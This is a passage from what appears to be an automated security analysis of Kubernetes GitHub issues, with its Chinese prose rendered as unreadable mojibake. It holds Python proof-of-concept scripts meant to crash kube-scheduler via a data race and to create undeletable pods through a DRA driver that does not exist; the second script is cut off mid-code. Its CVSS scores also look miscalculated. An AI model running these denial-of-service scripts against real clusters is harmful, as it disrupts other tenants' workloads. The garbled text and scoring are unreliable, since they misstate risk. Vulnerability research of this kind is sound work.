æ•°æ®ç«äº‰çš„æ ¸å¿ƒåœ¨äºï¼Œå½“ä¸€ä¸ªPodå› ä¸ºæ— æ³•è¢«è°ƒåº¦ï¼ˆä¾‹å¦‚ï¼Œèµ„æºä¸è¶³ï¼‰è€Œå¤„äºè°ƒåº¦å¤±è´¥é‡è¯•å¾ªç¯ä¸­æ—¶ï¼Œ`handleSchedulingFailure` æ­£åœ¨å¤„ç†è¿™ä¸ªPodã€‚å¦‚æœæ­¤æ—¶ç”¨æˆ·é€šè¿‡API Serveræ›´æ–°äº†è¯¥Podï¼ˆä¾‹å¦‚ï¼Œä¿®æ”¹äº†å®ƒçš„æ ‡ç­¾æˆ–æ³¨è§£ï¼‰ï¼ŒInformerä¼šè§¦å‘ `OnUpdate` äº‹ä»¶ï¼Œå¯¼è‡´è°ƒåº¦é˜Ÿåˆ—å¹¶å‘åœ°è¯»å–å’Œæ›´æ–°åŒä¸€ä¸ªPodå¯¹è±¡ã€‚ç”±äºè¿™ä¸¤ä¸ªæ“ä½œä¹‹é—´ç¼ºå°‘å¿…è¦çš„é”ä¿æŠ¤ï¼Œå¯¼è‡´äº†æ•°æ®ç«äº‰ã€‚

æ•°æ®ç«äº‰çš„åæœæ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œä½†é€šå¸¸ä¼šå¯¼è‡´ç¨‹åºè¡Œä¸ºå¼‚å¸¸æˆ–å´©æºƒã€‚åœ¨kube-schedulerè¿™ä¸ªæ ¸å¿ƒç»„ä»¶ä¸­ï¼Œå¯èƒ½çš„å½±å“åŒ…æ‹¬ï¼š
- **è°ƒåº¦å™¨å´©æºƒ**ï¼šè¯»å–åˆ°è¢«å¹¶å‘å†™å…¥çš„ã€ä¸ä¸€è‡´æˆ–æŸåçš„Podå¯¹è±¡æ•°æ®ï¼Œå¯èƒ½å¯¼è‡´ç©ºæŒ‡é’ˆè§£å¼•ç”¨æˆ–å…¶ä»–è¿è¡Œæ—¶é”™è¯¯ï¼Œä½¿è°ƒåº¦å™¨è¿›ç¨‹å´©æºƒã€‚è°ƒåº¦å™¨çš„æŒç»­å´©æºƒå°†å¯¼è‡´æ–°Podæ— æ³•è¢«è°ƒåº¦ï¼Œä»è€Œé€ æˆæ•´ä¸ªé›†ç¾¤çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚
- **è°ƒåº¦å†³ç­–é”™è¯¯**ï¼šè°ƒåº¦å™¨å¯èƒ½åŸºäºä¸ä¸€è‡´çš„æ•°æ®åšå‡ºé”™è¯¯çš„è°ƒåº¦å†³ç­–ï¼Œä¾‹å¦‚å°†Podè°ƒåº¦åˆ°ä¸ç¬¦åˆäº²å’Œæ€§/åäº²å’Œæ€§è§„åˆ™çš„èŠ‚ç‚¹ä¸Šï¼Œæˆ–è€…æ— æ³•ä¸ºæœ¬åº”å¯ä»¥è°ƒåº¦çš„Podæ‰¾åˆ°èŠ‚ç‚¹ã€‚
- **è°ƒåº¦é˜Ÿåˆ—çŠ¶æ€æŸå**ï¼šæ•°æ®ç«äº‰å¯èƒ½ç ´åè°ƒåº¦å™¨å†…éƒ¨é˜Ÿåˆ—çš„æ•°æ®ç»“æ„ï¼Œå¯¼è‡´æŸäº›Podæ°¸ä¹…åœç•™åœ¨â€œPendingâ€çŠ¶æ€ï¼Œæˆ–è€…è¢«é”™è¯¯åœ°ä»é˜Ÿåˆ—ä¸­ç§»é™¤ã€‚

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚ä¸€ä¸ªæ‹¥æœ‰åˆ›å»ºå’Œæ›´æ–°Podæƒé™çš„æ™®é€šç”¨æˆ·ï¼Œå¯ä»¥é€šè¿‡ç‰¹æ„æ„é€ ä¸€ä¸ªæ— æ³•è¢«è°ƒåº¦çš„Podï¼Œå¹¶æŒç»­åœ°æ›´æ–°è¯¥Podçš„å…ƒæ•°æ®ï¼Œæ¥å°è¯•è§¦å‘è¿™ä¸ªæ•°æ®ç«äº‰ï¼Œä»è€Œå¯¼è‡´è°ƒåº¦å™¨å´©æºƒï¼Œå½±å“æ•´ä¸ªé›†ç¾¤çš„å¯ç”¨æ€§ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
- **Attack Vector (AV): Network (N)**ï¼šæ”»å‡»è€…é€šè¿‡K8s API Serverå‘èµ·æ”»å‡»ã€‚
- **Attack Complexity (AC): High (H)**ï¼šæˆåŠŸè§¦å‘æ•°æ®ç«äº‰éœ€è¦ç²¾ç¡®çš„æ—¶æœºæ§åˆ¶ï¼Œæ˜¯æ¦‚ç‡æ€§äº‹ä»¶ã€‚
- **Privileges Required (PR): Low (L)**ï¼šæ”»å‡»è€…ä»…éœ€æ‹¥æœ‰åœ¨æŸä¸ªå‘½åç©ºé—´å†…åˆ›å»ºå’Œæ›´æ–°Podçš„æƒé™å³å¯ï¼Œè¿™æ˜¯éå¸¸å¸¸è§çš„æƒé™ã€‚
- **User Interaction (UI): None (N)**ï¼šæ— éœ€ç”¨æˆ·äº¤äº’ã€‚
- **Scope (S): Changed (C)**ï¼šæ”»å‡»çš„ç›®æ ‡æ˜¯kube-schedulerï¼Œå±äºæ§åˆ¶å¹³é¢ç»„ä»¶ã€‚å®ƒçš„å¤±æ•ˆä¼šå½±å“åˆ°é›†ç¾¤ä¸­æ‰€æœ‰å…¶ä»–ç”¨æˆ·çš„Podè°ƒåº¦ï¼Œè¶…å‡ºäº†æ”»å‡»è€…è‡ªèº«æƒé™èŒƒå›´ã€‚
- **Confidentiality (C): None (N)**ï¼šä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
- **Integrity (I): Low (L)**ï¼šå¯èƒ½å¯¼è‡´è°ƒåº¦é˜Ÿåˆ—æ•°æ®ä¸ä¸€è‡´ï¼Œå½±å“è°ƒåº¦å†³ç­–çš„æ­£ç¡®æ€§ã€‚
- **Availability (A): High (H)**ï¼šå¯èƒ½å¯¼è‡´kube-schedulerå´©æºƒå¹¶æŒç»­é‡å¯ï¼Œä½¿å¾—æ•´ä¸ªé›†ç¾¤æ— æ³•è°ƒåº¦æ–°çš„Podï¼Œé€ æˆä¸¥é‡çš„å¯ç”¨æ€§é—®é¢˜ã€‚

ç»¼åˆè¯„åˆ†ä¸º **CVSS 3.1: 7.5 (High)**ã€‚

å°½ç®¡æ”»å‡»å¤æ‚åº¦é«˜ï¼Œä½†ç”±äºæ”»å‡»è€…æƒé™è¦æ±‚ä½ï¼Œä¸”æˆåŠŸæ”»å‡»å¯å¯¼è‡´æ•´ä¸ªé›†ç¾¤èŒƒå›´çš„æ‹’ç»æœåŠ¡ï¼Œå½±å“å·¨å¤§ã€‚æ ¹æ®è§„åˆ™7å’Œè§„åˆ™8ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“æ•´ä¸ªé›†ç¾¤ï¼Œåº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
import threading
import time
import uuid
import sys
import os

# POCä¸»å‡½æ•°
def main():
    """
    è¯¥POCæ—¨åœ¨å¤ç°Kubernetesè°ƒåº¦å™¨ä¸­çš„æ•°æ®ç«äº‰æ¼æ´ã€‚
    å®ƒé€šè¿‡åˆ›å»ºä¸€ä¸ªæ— æ³•è¢«è°ƒåº¦çš„Podï¼Œå¹¶æŒç»­æ›´æ–°è¯¥Podçš„å…ƒæ•°æ®æ¥è§¦å‘ç«äº‰æ¡ä»¶ã€‚
    """
    # æ£€æŸ¥æ˜¯å¦å­˜åœ¨Kubeconfigæ–‡ä»¶
    kubeconfig_path = os.path.expanduser("~/.kube/config")
    if not os.path.exists(kubeconfig_path):
        print("é”™è¯¯ï¼šæœªåœ¨é»˜è®¤ä½ç½®æ‰¾åˆ° a Kubeconfig æ–‡ä»¶ (~/.kube/config)ã€‚")
        print("è¯·ç¡®ä¿æ‚¨å·²é…ç½®å¯¹Kubernetesé›†ç¾¤çš„è®¿é—®ã€‚")
        sys.exit(1)
        
    try:
        kubernetes.config.load_kube_config()
        api = kubernetes.client.CoreV1Api()
        print("æˆåŠŸè¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚")
    except Exception as e:
        print(f"è¿æ¥åˆ°Kubernetesé›†ç¾¤å¤±è´¥: {e}")
        sys.exit(1)

    namespace = "default"
    # ä½¿ç”¨UUIDç¡®ä¿podåç§°çš„å”¯ä¸€æ€§ï¼Œé¿å…ä¸ç°æœ‰podå†²çª
    pod_name = f"poc-data-race-{uuid.uuid4().hex[:6]}"
    
    # å®šä¹‰ä¸€ä¸ªæ— æ³•è¢«è°ƒåº¦çš„Podï¼Œè¯·æ±‚æå¤§çš„CPUèµ„æº
    unschedulable_pod = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": pod_name,
            "labels": {"app": "datarace-poc"}
        },
        "spec": {
            "containers": [
                {
                    "name": "pause",
                    "image": "registry.k8s.io/pause:3.6",
                    "resources": {
                        "requests": {
                            # è¯·æ±‚ä¸€ä¸ªé€šå¸¸ä¸å­˜åœ¨çš„å·¨å¤§CPUæ•°é‡ï¼Œç¡®ä¿Podæ— æ³•è°ƒåº¦
                            "cpu": "100000" 
                        }
                    }
                }
            ]
        }
    }

    # ç”¨äºåœ¨çº¿ç¨‹é—´åŒæ­¥å’Œåœæ­¢çš„äº‹ä»¶
    stop_event = threading.Event()
    
    # å¯åŠ¨æ›´æ–°Podçš„çº¿ç¨‹
    update_thread = threading.Thread(
        target=continuously_update_pod, 
        args=(api, pod_name, namespace, stop_event)
    )

    try:
        print(f"åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»ºæ— æ³•è°ƒåº¦çš„Pod '{pod_name}'...")
        api.create_namespaced_pod(body=unschedulable_pod, namespace=namespace)
        print("Podåˆ›å»ºæˆåŠŸã€‚å®ƒå°†ä¿æŒPendingçŠ¶æ€ã€‚")
        
        # ç­‰å¾…Podå‡ºç°åœ¨API Serverä¸­
        time.sleep(5)
        
        print("å¯åŠ¨å¹¶å‘æ›´æ–°çº¿ç¨‹ï¼ŒæŒç»­60ç§’ä»¥å°è¯•è§¦å‘æ•°æ®ç«äº‰...")
        update_thread.start()
        
        # è®©æ›´æ–°çº¿ç¨‹è¿è¡Œä¸€æ®µæ—¶é—´
        update_thread.join(timeout=60)
        
        # å¦‚æœçº¿ç¨‹åœ¨60ç§’åä»åœ¨è¿è¡Œï¼Œåˆ™å‘å…¶å‘é€åœæ­¢ä¿¡å·
        if update_thread.is_alive():
            print("POCè¿è¡Œè¶…æ—¶ï¼Œåœæ­¢æ›´æ–°çº¿ç¨‹ã€‚")
            stop_event.set()
            update_thread.join() # ç­‰å¾…çº¿ç¨‹ä¼˜é›…é€€å‡º

        print("POCæ‰§è¡Œå®Œæˆã€‚")
        print("è¯·æ£€æŸ¥kube-schedulerçš„æ—¥å¿—ï¼Œå¯»æ‰¾ä¸æ•°æ®ç«äº‰æˆ–å´©æºƒç›¸å…³çš„æ¡ç›®ã€‚")

    except kubernetes.client.ApiException as e:
        print(f"ä¸Kubernetes APIäº¤äº’æ—¶å‡ºé”™: {e.body}")
    except Exception as e:
        print(f"å‘ç”Ÿæ„å¤–é”™è¯¯: {e}")
    finally:
        # ç¡®ä¿åœæ­¢çº¿ç¨‹
        if not stop_event.is_set():
            stop_event.set()
        if update_thread.is_alive():
            update_thread.join()

        # æ¸…ç†èµ„æº
        try:
            print(f"æ­£åœ¨æ¸…ç†ï¼šåˆ é™¤Pod '{pod_name}'...")
            api.delete_namespaced_pod(
                name=pod_name, 
                namespace=namespace, 
                body=kubernetes.client.V1DeleteOptions()
            )
            print("æ¸…ç†å®Œæˆã€‚")
        except kubernetes.client.ApiException as e:
            # å¦‚æœPodå·²ç»ä¸å­˜åœ¨æˆ–æ— æ³•åˆ é™¤ï¼Œåˆ™å¿½ç•¥é”™è¯¯
            if e.status != 404:
                print(f"æ¸…ç†Podæ—¶å‡ºé”™: {e.body}")

def continuously_update_pod(api, pod_name, namespace, stop_event):
    """
    åœ¨ä¸€ä¸ªå¾ªç¯ä¸­æŒç»­æ›´æ–°Podçš„æ³¨è§£ï¼Œä»¥è§¦å‘OnUpdateäº‹ä»¶ã€‚
    """
    update_count = 0
    while not stop_event.is_set():
        try:
            patch_body = {
                "metadata": {
                    "annotations": {
                        "poc-update-trigger": str(time.time())
                    }
                }
            }
            api.patch_namespaced_pod(name=pod_name, namespace=namespace, body=patch_body)
            update_count += 1
            if update_count % 10 == 0:
                 print(f"å·²å‘é€ {update_count} æ¬¡æ›´æ–°...")
            # çŸ­æš‚ä¼‘çœ ä»¥é¿å…è¿‡åº¦è¯·æ±‚API Serverï¼Œä½†é¢‘ç‡ä»è¶³ä»¥è§¦å‘ç«äº‰
            time.sleep(0.1)
        except kubernetes.client.ApiException as e:
            if e.status == 404:
                # Podå·²è¢«åˆ é™¤ï¼Œåœæ­¢å¾ªç¯
                print("æ›´æ–°çº¿ç¨‹ï¼šPodå·²ä¸å­˜åœ¨ï¼Œåœæ­¢æ›´æ–°ã€‚")
                break
            else:
                print(f"æ›´æ–°çº¿ç¨‹ï¼šæ›´æ–°Podæ—¶å‡ºé”™: {e.reason}")
                time.sleep(1) # å‘ç”Ÿé”™è¯¯æ—¶ç­‰å¾…æ›´é•¿æ—¶é—´
        except Exception as e:
            print(f"æ›´æ–°çº¿ç¨‹ï¼šå‘ç”Ÿæ„å¤–é”™è¯¯: {e}")
            break

# è„šæœ¬å…¥å£
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æ­¤Pythonè„šæœ¬çš„ç›®çš„æ˜¯åœ¨çœŸå®çš„Kubernetesç¯å¢ƒä¸­åˆ›é€ èƒ½å¤Ÿè§¦å‘æ‰€è¿°æ•°æ®ç«äº‰æ¼æ´çš„æ¡ä»¶ã€‚å®ƒå¹¶ä¸èƒ½ç›´æ¥æ£€æµ‹åˆ°Goè¯­è¨€è¿è¡Œæ—¶ä¸­çš„å†…å­˜ç«äº‰ï¼Œè€Œæ˜¯é€šè¿‡æ¨¡æ‹Ÿæ”»å‡»è€…çš„è¡Œä¸ºæ¥è¯±å‘`kube-scheduler`å†…éƒ¨çš„å¹¶å‘é—®é¢˜ã€‚

è„šæœ¬ä¸»è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
1.  **è¿æ¥é›†ç¾¤**: ä½¿ç”¨æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`~/.kube/config`ï¼‰è¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚
2.  **åˆ›å»ºæ— æ³•è°ƒåº¦çš„Pod**: å®šä¹‰ä¸€ä¸ªPodï¼Œå…¶è¯·æ±‚çš„CPUèµ„æºé‡ï¼ˆ`100000`æ ¸ï¼‰è¿œè¶…ä»»ä½•ç‰©ç†èŠ‚ç‚¹æ‰€èƒ½æä¾›ã€‚è¿™ç¡®ä¿äº†è¯¥Podä¸€æ—¦è¢«åˆ›å»ºï¼Œå°±ä¼šè¢«è°ƒåº¦å™¨åˆ¤å®šä¸ºæ— æ³•è°ƒåº¦ï¼Œå¹¶è¿›å…¥è°ƒåº¦å¤±è´¥å¤„ç†æµç¨‹ï¼ˆå³è°ƒç”¨`handleSchedulingFailure`çš„é€»è¾‘è·¯å¾„ï¼‰ã€‚
3.  **å¹¶å‘æ›´æ–°Pod**:
    -   è„šæœ¬åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹`update_thread`ã€‚
    -   è¯¥çº¿ç¨‹åœ¨ä¸€ä¸ªå¾ªç¯ä¸­ï¼Œä»¥é«˜é¢‘ç‡ï¼ˆæ¯0.1ç§’ï¼‰é€šè¿‡`patch`æ“ä½œæ›´æ–°Podçš„æ³¨è§£ï¼ˆ`annotations`ï¼‰ã€‚
    -   æ¯ä¸€æ¬¡æˆåŠŸçš„`patch`æ“ä½œéƒ½ä¼šåœ¨etcdä¸­äº§ç”Ÿä¸€ä¸ªPodæ›´æ–°äº‹ä»¶ã€‚`kube-scheduler`çš„Informerä¼šç›‘å¬åˆ°è¿™ä¸ªäº‹ä»¶ï¼Œå¹¶è§¦å‘`OnUpdate`å¤„ç†å™¨ï¼Œä»è€Œè°ƒç”¨`PriorityQueue.Update()`å‡½æ•°ã€‚
4.  **åˆ›é€ ç«äº‰æ¡ä»¶**: ä¸»çº¿ç¨‹åˆ›å»ºPodåï¼Œè°ƒåº¦å™¨å¼€å§‹å°è¯•è°ƒåº¦å®ƒå¹¶å¤±è´¥ã€‚å‡ ä¹åŒæ—¶ï¼Œ`update_thread`å¼€å§‹é¢‘ç¹æ›´æ–°è¯¥Podã€‚è¿™å°±åˆ›é€ äº†`handleSchedulingFailure`ï¼ˆå†™æ“ä½œï¼‰å’Œ`PriorityQueue.Update`ï¼ˆè¯»æ“ä½œï¼‰åœ¨`kube-scheduler`å†…éƒ¨å¹¶å‘è®¿é—®åŒä¸€ä¸ªPodå¯¹è±¡æ•°æ®ç»“æ„çš„æœºä¼šï¼Œä»è€Œå¤ç°äº†Issueä¸­æè¿°çš„æ•°æ®ç«äº‰åœºæ™¯ã€‚
5.  **è¶…æ—¶ä¸æ¸…ç†**: è„šæœ¬ä¼šè¿è¡Œ60ç§’ï¼Œä»¥æä¾›è¶³å¤Ÿçš„æ—¶é—´çª—å£æ¥è§¦å‘é—®é¢˜ã€‚ä¹‹åï¼Œæ— è®ºæ˜¯å¦æˆåŠŸè§¦å‘å´©æºƒï¼Œè„šæœ¬éƒ½ä¼šåœæ­¢æ›´æ–°çº¿ç¨‹ï¼Œå¹¶åˆ é™¤åˆ›å»ºçš„Podï¼Œä»¥æ¸…ç†æµ‹è¯•ç¯å¢ƒã€‚

è¦éªŒè¯è¯¥æ¼æ´æ˜¯å¦è¢«è§¦å‘ï¼Œç”¨æˆ·éœ€è¦åœ¨è¿è¡Œæ­¤è„šæœ¬æœŸé—´ï¼Œç›‘æ§`kube-scheduler`ç»„ä»¶çš„æ—¥å¿—ã€‚å¦‚æœæ•°æ®ç«äº‰å¯¼è‡´äº†å´©æºƒï¼Œæ—¥å¿—ä¸­ä¼šè®°å½•`panic`ä¿¡æ¯ï¼Œå¹¶ä¸”`kube-scheduler` Podä¼šé‡å¯ã€‚

---


## Issue #131957 DRA: pod deletion delayed although NodePrepareResources was never issued

- Issue é“¾æ¥ï¼š[#131957](https://github.com/kubernetes/kubernetes/issues/131957)

### Issue å†…å®¹

#### What happened?

I am revamping our E2E tests so that they run through test cases without DRA drivers. Those tests then can become conformance tests.

Here's one scenario:
- ResourceSlices published by control plane (e.g. network-attached)
- pod scheduled
- pod startup fails (cannot call NodePrepareResources)
- delete pod
-> hangs

There is this event:
```
  Warning  FailedPrepareDynamicResources  81s   kubelet            Failed to prepare dynamic resources: failed to get gRPC client for driver dra-1411.k8s.io: plugin name dra-1411.k8s.io not found in the list of registered DRA plugins
```

It looks like the kubelet assumes that NodePrepareResources might have been called and therefore blocks pod termination while trying to call NodeUnprepareResources. 

cc @bart0sh 


#### What did you expect to happen?

The kubelet should track whether it really issued a `NodePrepareResources`, not just that it tried to do that. Then deleting the pod should proceed.

Rationale: if a pod lands on a node by mistake, then deleting the pod should be sufficient to recover from that mistake.

Also, the error message is a bit too verbose. The driver name should be given once, and "not found in the list" could be shortened? Also, don't repeat the word "failed". The innermost error can use it if there truly was a failure, but wrapping an error should then only add context.

```
prepare dynamic resources: get gRPC client for driver dra-1411.k8s.io: plugin not registered
```


#### How can we reproduce it (as minimally and precisely as possible)?

https://github.com/kubernetes/kubernetes/pull/131956

```
dlv test ./test/e2e -- -ginkgo.focus "control plane with single node.*supports external claim referenced by multiple containers of multiple pods"  -test.v -ginkgo.v -v=3
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesçš„åŠ¨æ€èµ„æºåˆ†é…ï¼ˆDynamic Resource Allocation, DRAï¼‰åŠŸèƒ½ä¸­å­˜åœ¨çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ¼æ´ã€‚

é—®é¢˜æ ¹æºåœ¨äº `kubelet` ç»„ä»¶çš„çŠ¶æ€ç®¡ç†ä¸å½“ã€‚å…·ä½“åœºæ™¯å¦‚ä¸‹ï¼š
1.  ä¸€ä¸ªPodè¢«è°ƒåº¦åˆ°æŸä¸ªNodeä¸Šï¼Œè¯¥Podåœ¨å…¶å®šä¹‰ä¸­è¯·æ±‚äº†ç”±æŸä¸ªDRAé©±åŠ¨æä¾›çš„åŠ¨æ€èµ„æºã€‚
2.  ç„¶è€Œï¼Œè¯¥Nodeä¸Šå¹¶æœªå®‰è£…æˆ–æ³¨å†Œæ‰€è¯·æ±‚çš„DRAé©±åŠ¨ã€‚
3.  å› æ­¤ï¼Œ`kubelet` åœ¨å°è¯•ä¸ºPodå‡†å¤‡èµ„æºæ—¶è°ƒç”¨ `NodePrepareResources` å¤±è´¥ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª `FailedPrepareDynamicResources` çš„äº‹ä»¶ã€‚Podå¯åŠ¨å¤±è´¥ã€‚
4.  å½“ç”¨æˆ·æˆ–ç³»ç»Ÿå°è¯•åˆ é™¤è¿™ä¸ªå¤±è´¥çš„Podæ—¶ï¼Œåˆ é™¤æ“ä½œä¼šä¸€ç›´æŒ‚èµ·ï¼ˆhangï¼‰ã€‚

æ ¹æœ¬åŸå› åœ¨äºï¼Œ`kubelet` é”™è¯¯åœ°å‡è®¾åªè¦å®ƒå°è¯•è¿‡è°ƒç”¨ `NodePrepareResources`ï¼ˆå³ä½¿è°ƒç”¨å¤±è´¥äº†ï¼‰ï¼Œåœ¨Podåˆ é™¤æ—¶å°±å¿…é¡»è°ƒç”¨å¯¹åº”çš„ `NodeUnprepareResources` æ¥è¿›è¡Œæ¸…ç†ã€‚ç”±äºDRAé©±åŠ¨æ ¹æœ¬ä¸å­˜åœ¨ï¼Œè°ƒç”¨ `NodeUnprepareResources` çš„å°è¯•åŒæ ·ä¼šå¤±è´¥æˆ–è¶…æ—¶ï¼Œå¯¼è‡´ `kubelet` æ— æ³•å®ŒæˆPodçš„æ¸…ç†æµç¨‹ï¼Œä»è€Œé˜»æ­¢äº†Podå¯¹è±¡çš„æœ€ç»ˆåˆ é™¤ã€‚

è¿™ç§è¡Œä¸ºæ„æˆäº†ä¸€ä¸ªæ‹’ç»æœåŠ¡æ¼æ´ã€‚åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼ˆæ‹¥æœ‰åˆ›å»ºPodæƒé™ï¼‰å¯ä»¥æ•…æ„åˆ›å»ºè¯·æ±‚ä¸å­˜åœ¨çš„DRAé©±åŠ¨çš„Podã€‚è¿™äº›Podä¸€æ—¦è¢«åˆ›å»ºï¼Œå°±ä¼šè¿›å…¥ä¸€ä¸ªæ— æ³•åˆ é™¤çš„â€œåƒµå°¸â€çŠ¶æ€ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å¤§è§„æ¨¡åˆ›å»ºæ­¤ç±»Podï¼Œè€—å°½API Serverï¼ˆetcdï¼‰çš„å­˜å‚¨èµ„æºï¼Œæˆ–å¯¹è°ƒåº¦å™¨å’Œæ§åˆ¶å™¨é€ æˆä¸å¿…è¦çš„å‹åŠ›ï¼Œä»è€Œå½±å“æ•´ä¸ªé›†ç¾¤çš„å¯ç”¨æ€§ï¼Œå¯¼è‡´å…¶ä»–åˆæ³•ç”¨æˆ·çš„Podæ— æ³•è¢«è°ƒåº¦æˆ–ç®¡ç†ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
-   è¿™æ˜¯ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼Œå…·ä½“ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚
-   æ ¹æ®CVSS 3.1è¯„åˆ†ï¼Œå…¶åŸºç¡€å¾—åˆ†ä¸º `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`ï¼Œè®¡ç®—ç»“æœä¸º **7.5**ï¼Œå±äºé«˜é£é™©ï¼ˆHighï¼‰ã€‚
-   è™½ç„¶åˆ©ç”¨æ­¤æ¼æ´éœ€è¦åˆ›å»ºPodçš„æƒé™ï¼ˆéåªè¯»æƒé™ï¼‰ï¼Œä½†æ ¹æ®æ ‡å‡†ç¬¬8æ¡ï¼šâ€œå¦‚æœIssueå¯ä»¥å‘ç”Ÿåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸­ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“å’Œè‡ªå·±æƒé™ä¸€æ ·ç”šè‡³æ›´é«˜çš„å…¶ä»–ç”¨æˆ·...åˆ™åº”åˆ¤æ–­ä¸ºé«˜é£é™©â€ã€‚è¯¥æ¼æ´å…è®¸ä½æƒé™ç”¨æˆ·é€šè¿‡åˆ›å»ºæ— æ³•åˆ é™¤çš„èµ„æºæ¥å½±å“æ•´ä¸ªé›†ç¾¤çš„å¯ç”¨æ€§ï¼Œç¬¦åˆé«˜é£é™©çš„å®šä¹‰ã€‚å› æ­¤ï¼Œå°½ç®¡æ ‡å‡†ç¬¬5æ¡å»ºè®®é™çº§ï¼Œä½†æ ¹æ®æ ‡å‡†ç¬¬8æ¡çš„æ›´é«˜ä¼˜å…ˆçº§ï¼Œæ­¤é—®é¢˜åº”è¢«è¯„ä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import uuid
import sys
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException
from contextlib import contextmanager

# å®šä¹‰POCæ‰€éœ€çš„å¸¸é‡
POC_NAMESPACE = f"dra-dos-poc-{uuid.uuid4().hex[:6]}"
NON_EXISTENT_DRIVER_NAME = "non-existent-driver.example.com"
RESOURCE_CLASS_NAME = "poc-resource-class"
RESOURCE_CLAIM_NAME = "poc-resource-claim"
POD_NAME = "poc-stuck-pod"
TIMEOUT_SECONDS = 120  # 2åˆ†é’Ÿè¶…æ—¶

@contextmanager
def get_k8s_api():
    """åŠ è½½kubeconfigå¹¶æä¾›k8s APIå¯¹è±¡çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ã€‚"""
    try:
        config.load_kube_config()
        core_v1 = client.CoreV1Api()
        resource_v1alpha2 = client.CustomObjectsApi()
        yield core_v1, resource_v1alpha2
    except Exception as e:
        print(f"[-] é”™è¯¯ï¼šæ— æ³•åŠ è½½Kubernetesé…ç½®æˆ–åˆ›å»ºAPIå®¢æˆ·ç«¯: {e}")
        print("[-] è¯·ç¡®ä¿æ‚¨çš„kubeconfigé…ç½®æ­£ç¡®ä¸”é›†ç¾¤å¯è®¿é—®ã€‚")
        sys.exit(1)

def create_namespace(api: client.CoreV1Api, name: str):
    """åˆ›å»ºå‘½åç©ºé—´"""
    print(f"[+] æ­£åœ¨åˆ›å»ºå‘½åç©ºé—´: {name}")
    namespace = client.V1Namespace(metadata=client.V1ObjectMeta(name=name))
    try:
        api.create_namespace(body=namespace)
        print(f"[+] å‘½åç©ºé—´ '{name}' åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print(f"[*] å‘½åç©ºé—´ '{name}' å·²å­˜åœ¨ï¼Œç»§ç»­æ‰§è¡Œ...")
        else:
            raise

def create_resource_class(api: client.CustomObjectsApi):
    """åˆ›å»ºResourceClassï¼ŒæŒ‡å‘ä¸€ä¸ªä¸å­˜åœ¨çš„é©±åŠ¨"""
    print(f"[+] æ­£åœ¨åˆ›å»ºResourceClass: {RESOURCE_CLASS_NAME}")
    resource_class = {
        "apiVersion": "resource.k8s.io/v1alpha2",
        "kind": "ResourceClass",
        "metadata": {
            "name": RESOURCE_CLASS_NAME,
        },
        "driverName": NON_EXISTENT_DRIVER_NAME,
        "suitableNodes": None, # é€‚ç”¨äºæ‰€æœ‰èŠ‚ç‚¹
    }
    try:
        api.create_cluster_custom_object(
            group="resource.k8s.io",
            version="v1alpha2",
            plural="resourceclasses",
            body=resource_class
        )
        print(f"[+] ResourceClass '{RESOURCE_CLASS_NAME}' åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print(f"[*] ResourceClass '{RESOURCE_CLASS_NAME}' å·²å­˜åœ¨ï¼Œç»§ç»­æ‰§è¡Œ...")
        else:
            raise

def create_resource_claim(api: client.CustomObjectsApi):
    """åˆ›å»ºResourceClaim"""
    print(f"[+] æ­£åœ¨åˆ›å»ºResourceClaim: {RESOURCE_CLAIM_NAME}")
    resource_claim = {
        "apiVersion": "resource.k8s.io/v1alpha2",
        "kind": "ResourceClaim",
        "metadata": {
            "name": RESOURCE_CLAIM_NAME,
        },
        "spec": {
            "resourceClassName": RESOURCE_CLASS_NAME,
        },
    }
    try:
        api.create_namespaced_custom_object(
            group="resource.k8s.io",
            version="v1alpha2",
            namespace=POC_NAMESPACE,
            plural="resourceclaims",
            body=resource_claim
        )
